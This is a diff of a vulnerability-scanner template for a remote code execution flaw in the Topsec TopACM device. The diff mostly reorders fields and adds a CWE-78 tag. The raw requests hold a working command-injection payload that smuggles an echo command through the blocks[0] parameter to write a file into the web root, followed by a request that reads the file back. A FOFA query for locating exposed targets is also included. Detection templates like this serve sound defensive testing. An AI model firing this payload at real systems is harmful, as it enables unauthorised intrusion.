@@ -1,5 +1,4 @@
 id: topsec-topacm-rce
-
 info:
   name: Topsec Topacm - Remote Code Execution
   author: SleepingBag945
@@ -9,36 +8,34 @@ info:
   reference:
     - https://github.com/achuna33/MYExploit/blob/8ffbf7ee60cbd77ad90b0831b93846aba224ab29/src/main/java/com/achuna33/Controllers/TRXController.java
     - https://github.com/Phuong39/2022-HW-POC/blob/main/天融信-上网行为管理系统RCE.md
+  classification:
+    cwe-id:
+      - CWE-78
   metadata:
     runzero-review: REJECT/2025-11-07/excluding tag intrusive
-    verified: true
-    max-request: 2
     fofa-query: body="ActiveXObject" && body="dkey_login" && body="repeat-x"
-  tags: rce,topsec,topacm,intrusive,vuln
-
+    max-request: 2
+    verified: true
+  tags: intrusive,rce,topacm,topsec,vuln
 http:
-  - raw:
+  - matchers:
+      - part: body_2
+        type: word
+        words:
+          - '{{randstr}}'
+      - part: header_2
+        type: word
+        words:
+          - text/plain
+      - part: header_2
+        status:
+          - 200
+        type: status
+    matchers-condition: and
+    raw:
       - |
         GET /view/IPV6/naborTable/static_convert.php?blocks[0]=||%20echo%20%27{{randstr}}%27%20%3E%20/var/www/html/config_application.txt%0a HTTP/1.1
         Host: {{Hostname}}
       - |
         GET /config_application.txt HTTP/1.1
         Host: {{Hostname}}
-
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: body_2
-        words:
-          - "{{randstr}}"
-
-      - type: word
-        part: header_2
-        words:
-          - text/plain
-
-      - type: status
-        part: header_2
-        status:
-          - 200
-
